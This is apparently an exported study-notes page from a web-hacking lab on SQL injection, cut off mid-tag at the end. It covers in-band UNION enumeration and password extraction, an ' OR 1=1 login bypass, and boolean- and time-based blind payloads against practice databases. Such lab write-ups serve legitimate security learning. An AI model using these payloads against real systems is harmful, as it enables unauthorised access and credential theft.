integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80d4-8cc2-f4be5609e94c" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">https://website.thm/blog?id=1
+SELECT * from blog where id=1 and private=0 LIMIT 1;</code></pre></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8030-9df4-cd9a586792df" class="">This will retrieve from the blog table an article with id equal to 1 and private=0 means its public and the retrieval is limited to 1 article.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8080-b375-e88da2a3752f" class="">Now lets consider and article with id=2 which is not public,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80b7-bda0-fbd9e2c1776f" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">https://website.thm/blog?id=2;--
+SELECT * from blog where id=2;-- and private=0 LIMIT 1;
+SELECT * from blog where id=2;</code></pre></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8002-9bfd-efdfc65d7991" class="">What happens, the semicolon tells that the query ends at id=2 and the — comments the rest of the query, hence retrieving a file kept as private.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-80d4-9211-ccff6742ae42" class="">There are three type of SQL Injection,</p></div><div style="display:contents" dir="auto"><ol type="1" id="25d3eecd-ed53-804d-af30-c844d1163e3d" class="numbered-list" start="1"><li>In-Band SQL Injection</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="25d3eecd-ed53-8079-8755-eb0f8324de81" class="numbered-list" start="2"><li>Blind SQL Injection</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="25d3eecd-ed53-8079-83a2-dab51720578e" class="numbered-list" start="3"><li>Out-of-Band SQL Injection</li></ol></div><div style="display:contents" dir="auto"><h3 id="25d3eecd-ed53-806d-8a67-fc46b0e8d2a7" class="">In-Band SQLi</h3></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8057-a223-f7b9e4d9e387" class="">In-Band refers to the same method of communication being used to exploit the vulnerability and receive the results. For example, discovering a SQL vulnerability on a page and able to extract data and display it on the same page.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8030-ace8-f3abc9716ef6" class="">Error based SQLi- very useful in obtaining information regarding the database structure or even the whole database.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-802c-b420-d8bc475163ed" class="">Union based SQLi - using a union alongside a search operator to extract data, it&#x27;s the most commonly used exploit to retrieve large amounts of data.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-805a-947f-ce5f85106516" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">1 UNION SELECT 1</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-803d-93ad-f358d563cadd" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-809c-a4c1-fc3a36b157c0" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">
+1 UNION SELECT 1,2,3</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-80a0-84b8-c7fa28b4ba29" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%201.png"><img style="width:709.96875px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%201.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-8004-bba3-d02c59e9969e" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">0 UNION SELECT 1,2,3</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-8079-ba8b-cc3187c3ab00" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%202.png"><img style="width:709.96875px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%202.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-808d-a70e-c0ff0ac26f8b" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">0 UNION SELECT 1,2,database()</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-80ed-9833-e27aa71d7ff3" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%203.png"><img style="width:709.984375px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%203.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-803f-9da7-f0f045ee1b7e" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;sqli_one&#x27;</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-8006-b04c-cc03d6b9bc45" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%204.png"><img style="width:709.96875px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%204.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-805e-98cf-fc417f5d102b" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#x27;staff_users&#x27;</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-8033-b609-e24f4b8f7e58" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%205.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%205.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-8089-b999-cb61d47a8726" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">0 UNION SELECT 1,2,password FROM staff_users WHERE username = &#x27;martin&#x27;;</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-8021-ad92-c3cc0da68f16" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%206.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%206.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80b4-aa80-d7932983116b" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">group_concat(username,&#x27;:&#x27;,password SEPARATOR &#x27;&lt;br&gt;&#x27;) FROM staff_users</code></pre></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-804e-9d64-e99531ca85c7" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%207.png"><img style="width:709.96875px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%207.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-806f-99d5-fea94117a272" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%208.png"><img style="width:507px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%208.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="25d3eecd-ed53-8050-8c67-e29808bc1441" class="">Blind SQLi</h2></div><div style="display:contents" dir="auto"><h3 id="25e3eecd-ed53-8069-b309-f8c0a31e8b3e" class="">Authentication Bypass</h3></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-80da-b9b4-c1f6b06c05f2" class="">We get little to no feedback to confirm whether our exploit worked.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-80f9-8295-ec97d4364e74" class="">Authentication bypass is one of the most common techniques for blind SQLi, in login form the web application is not interested in retrieving the username or password, it is interested to check if the combination works or not, so it just asks the same to database.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-8048-9624-cc9b058b639b" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">select * from users where username=&#x27;%username%&#x27; and password=&#x27;%password%&#x27; LIMIT 1;</code></pre></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8049-848f-fa55d3bd0f1a" class="">so in this the payload is passed to the password column,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80eb-9400-c4ea76adcd04" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">&#x27; OR 1=1;--</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80a4-a775-c53e63ed6e9f" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all"> select * from users where username=%username%&#x27; and password=&#x27;&#x27; OR 1=1;-- &#x27; LIMIT 1;</code></pre></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8074-867f-e3e098835930" class="">Now this will show true since 1=1.</p></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-804d-a507-c5f3c1b50863" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%209.png"><img style="width:407px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%209.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-80b2-a8ce-cf057f58f039" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2010.png"><img style="width:343px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2010.png"/></a></figure></div><div style="display:contents" dir="ltr"><figure id="25d3eecd-ed53-8037-84fc-f74c429ae345" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2011.png"><img style="width:448px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2011.png"/></a></figure></div><div style="display:contents" dir="auto"><h3 id="25e3eecd-ed53-8065-b9b7-e98e925e91d0" class="">Boolean Based</h3></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-8009-81b3-c9b18ace3ef5" class="">It refers to the response we receive for our injection attempts, which could be on/off, true/false, yes/no, etc.</p></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-803f-a88d-e8765c2782d7" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2012.png"><img style="width:425px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2012.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80bc-96f5-c869ae106677" class="">This gave as error, stating the columns are not matching, so until we get the no of columns</p></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-8099-bf8e-dc747c54d20b" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2013.png"><img style="width:408px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2013.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-807b-b457-db4ebe87fe12" class="">To find info on database, before in the authentication bypass we used WHERE because the output was printed but here, we use like because we get either true or false, so the question should be like or not.</p></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-80ce-b360-fb41af108110" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2014.png"><img style="width:414px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2014.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-803e-8cfa-c1443ba43516" class="">We first start with the first letter like a% and it returns false, we check with all letters and got true for s.</p></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-80a3-b8b3-c19da1b72601" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2015.png"><img style="width:419px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2015.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-8069-9d08-d15ae2c4f4b7" class="">Similarly doing for ‘sa%’,’sb%’ and so on until we get the full name of the database, which is  sqli_three. Now to enumerate the tables the same way,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-80ed-8274-f9a059634996" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#x27;sqli_three&#x27; and table_name like &#x27;a%&#x27;;--</code></pre></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-8011-83be-c6c41bfb0ca4" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#x27;sqli_three&#x27; and table_name=&#x27;users&#x27;;--</code></pre></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80e2-815e-f43892a90cb5" class="">Finally got table name <strong>users</strong>, by the way we could automate this process using burpsuite.</p></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-801c-95ec-c5c039993597" class="">Similarly to find columns in the table users,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-806b-92dd-f00f01d7b79a" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#x27;sqli_three&#x27; and TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME like &#x27;a%&#x27;;</code></pre></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-8078-9d9b-e79648408f99" class="">we get column name id, to enumerate other columns names we have to mention that it should not be id,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-807b-a60d-da341ebdd087" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">admin123&#x27; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#x27;sqli_three&#x27; and TABLE_NAME=&#x27;users&#x27; and COLUMN_NAME like &#x27;a%&#x27; and COLUMN_NAME !=&#x27;id&#x27;;</code></pre></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80e3-b441-da690bd7d075" class="">By this method we can find that the column names are id, username and password. </p></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80ae-b39b-c23bc910b63a" class="">Similarly to enumerate the password of admin,</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-80bc-b669-ec055bf854c1" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">admin123&#x27; UNION SELECT 1,2,3 from users where username=&#x27;admin&#x27; and password like &#x27;a%&#x27;;--</code></pre></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-8070-ba0e-fe48ad54cefd" class="">so the found password is 3845.</p></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-80d7-86ca-c967cbf2e9d7" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2016.png"><img style="width:459px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2016.png"/></a></figure></div><div style="display:contents" dir="auto"><h2 id="25e3eecd-ed53-8009-93d2-f49f594fccc0" class="">Time Based</h2></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-80fb-99ba-edd0509320a5" class="">It is similar to bollean based but there is no indicator that the query is right or wrong, it is actually the time the query takes to complete, we will be using SLEEP(x) operator to check.</p></div><div style="display:contents" dir="auto"><p id="25e3eecd-ed53-801c-a2b7-fbf65833618c" class="">the sleep method will only get executed upon successful UNION SELECT statement.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-8055-b05f-d6f9bdd071e3" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">admin123&#x27; UNION SELECT SLEEP(5);--
+admin123&#x27; UNION SELECT SLEEP(5),2;--</code></pre></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-800b-912f-cad3e3bcebda" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2017.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2017.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25e3eecd-ed53-800a-82ad-e55281bcfbb6" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">referrer=admin123&#x27; UNION SELECT SLEEP(5),2 where database() like &#x27;sqli_four&#x27;;--</code></pre></div><div style="display:contents" dir="ltr"><figure id="25e3eecd-ed53-80e8-9b7c-ea86e3c2aeb8" class="image"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2018.png"><img style="width:710px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/image%2018.png"/></a></figure></div><div style="display:contents" dir="auto"><script 